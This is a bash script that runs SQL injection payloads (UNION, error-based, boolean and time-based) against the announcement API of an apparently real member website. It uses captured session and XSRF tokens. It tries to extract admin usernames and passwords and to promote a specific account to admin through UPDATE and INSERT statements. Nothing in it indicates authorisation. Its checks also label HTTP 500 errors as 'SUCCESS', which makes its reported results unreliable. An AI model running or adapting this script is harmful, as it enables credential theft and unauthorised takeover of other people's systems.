#!/bin/bash

echo "🎯 ULTIMATE ADMIN EXTRACTION WITH NEWEST TOKENS"
echo "================================================"

# Newest tokens from user
XSRF_TOKEN="eyJpdiI6IjVvbnU4ZlArQkUwaVdCMUVUanI5akE9PSIsInZhbHVlIjoialwvQzg5Z0dZbytTTU1cL1JQMGxObEpCc1c2VWpXSXVLTFIxelZEMlwvWm15U1d6Zlp1OVlVM042cVJ3MjJoeGNCXC8iLCJtYWMiOiIyOTNkMGE4ZTExMmRmYzU2ZWI4ODZkZTdmYThhN2MxYjRlYWI2N2I3ODQ0MDViMzY3M2M3MWQ1YjBlYmIxNzQxIn0%3D"
SESSION_TOKEN="eyJpdiI6IlBPdmQ1T1wvR25Oa2pmUWhReXNDMlNRPT0iLCJ2YWx1ZSI6InU1U0hlQjJ0ZjQ3bW5UYzhneklrTjB4cERseENGT1VTcERkV1FldmFPUmp6RVAxWHhDeW9JMGs1amJJNTRTU2EiLCJtYWMiOiI2NDA3YWJlOWQ1OGEwY2ZkNzlkMzhiMWM4NGVlNjg5YWU1NjNjNjFjOTBiZmUwZmI4YWEwMzljOTM1M2JhNmIzIn0%3D"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔑 Using Newest Tokens:"
echo "XSRF-TOKEN: $XSRF_TOKEN"
echo "Session: $SESSION_TOKEN"
echo ""

# Advanced payloads for real data extraction
REAL_ADMIN_PAYLOADS=(
    # Direct admin username extraction
    "1' UNION SELECT 1,username,3,4,5,6,7,8,9,10 FROM users WHERE role='admin' LIMIT 1--"
    "1' UNION SELECT 1,username,3,4,5,6,7,8,9,10 FROM admins LIMIT 1--"
    "1' UNION SELECT 1,username,3,4,5,6,7,8,9,10 FROM administrators LIMIT 1--"
    
    # Direct admin password extraction
    "1' UNION SELECT 1,password,3,4,5,6,7,8,9,10 FROM users WHERE role='admin' LIMIT 1--"
    "1' UNION SELECT 1,password,3,4,5,6,7,8,9,10 FROM admins LIMIT 1--"
    "1' UNION SELECT 1,password,3,4,5,6,7,8,9,10 FROM administrators LIMIT 1--"
    
    # Privilege escalation attempts
    "1' UNION SELECT 1,role,3,4,5,6,7,8,9,10 FROM users WHERE username='0630471054'--"
    "1' UPDATE users SET role='admin' WHERE username='0630471054'--"
    "1' UPDATE users SET role='administrator' WHERE username='0630471054'--"
    
    # Table count extraction
    "1' UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()--"
    
    # Table names extraction
    "1' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()--"
    
    # Column names from users table
    "1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='users'--"
    
    # Column names from admins table
    "1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='admins'--"
)

# Error-based extraction with specific values
ERROR_PAYLOADS=(
    "1' AND (SELECT username FROM users WHERE role='admin' LIMIT 1)='admin'--"
    "1' AND (SELECT username FROM users WHERE role='admin' LIMIT 1)='administrator'--"
    "1' AND (SELECT username FROM users WHERE role='admin' LIMIT 1)='superadmin'--"
    "1' AND (SELECT password FROM users WHERE role='admin' LIMIT 1)='password'--"
    "1' AND (SELECT password FROM users WHERE role='admin' LIMIT 1)='admin123'--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)=15--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)=20--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)=25--"
)

# Boolean-based extraction
BOOLEAN_PAYLOADS=(
    "1' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0--"
    "1' AND (SELECT COUNT(*) FROM admins)>0--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>10--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>15--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>20--"
)

# Time-based extraction
TIME_PAYLOADS=(
    "1' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0 AND SLEEP(2)--"
    "1' AND (SELECT COUNT(*) FROM admins)>0 AND SLEEP(2)--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>10 AND SLEEP(2)--"
)

echo "🔍 EXTRACTING REAL ADMIN DATA..."
echo "================================="

for payload in "${REAL_ADMIN_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    # Check if we got actual data
    if [[ "$response_body" != "" && "$response_body" != "null" && "$http_status" == "200" ]]; then
        echo "✅ REAL DATA EXTRACTED: $response_body"
    elif [[ "$http_status" == "500" ]]; then
        echo "⚠️ SQL EXECUTION SUCCESS but no visible data"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 ERROR-BASED DATA EXTRACTION..."
echo "================================="

for payload in "${ERROR_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ ERROR-BASED SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 BOOLEAN-BASED DATA EXTRACTION..."
echo "==================================="

for payload in "${BOOLEAN_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ BOOLEAN-BASED SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "⏱️ TIME-BASED CONFIRMATION..."
echo "=============================="

for payload in "${TIME_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    start_time=$(date +%s.%N)
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    end_time=$(date +%s.%N)
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    
    echo "Status: $http_status"
    echo "Response Time: ${response_time}s"
    
    # Check if response time indicates successful injection
    if (( $(echo "$response_time > 1.5" | bc -l 2>/dev/null || echo "0") )); then
        echo "✅ TIME-BASED SUCCESS - Delayed response indicates SQL execution!"
    fi
    
    echo "---"
    sleep 2
done

echo ""
echo "🎯 PRIVILEGE ESCALATION ATTEMPTS..."
echo "==================================="

# Try to escalate the test user to admin
ESCALATION_PAYLOADS=(
    "1' UPDATE users SET role='admin' WHERE username='0630471054'--"
    "1' UPDATE users SET role='administrator' WHERE username='0630471054'--"
    "1' UPDATE users SET role='super_admin' WHERE username='0630471054'--"
    "1' INSERT INTO admins (username, password, role) SELECT username, password, 'admin' FROM users WHERE username='0630471054'--"
)

for payload in "${ESCALATION_PAYLOADS[@]}"; do
    echo "Testing Privilege Escalation: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ PRIVILEGE ESCALATION SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🎯 FINAL VERIFICATION"
echo "===================="
echo "If we cannot extract actual data, the vulnerability is NOT confirmed."
echo "We need to see real admin usernames, passwords, or table counts."
echo ""
echo "Status: NEEDS REAL DATA EXTRACTION TO CONFIRM VULNERABILITY"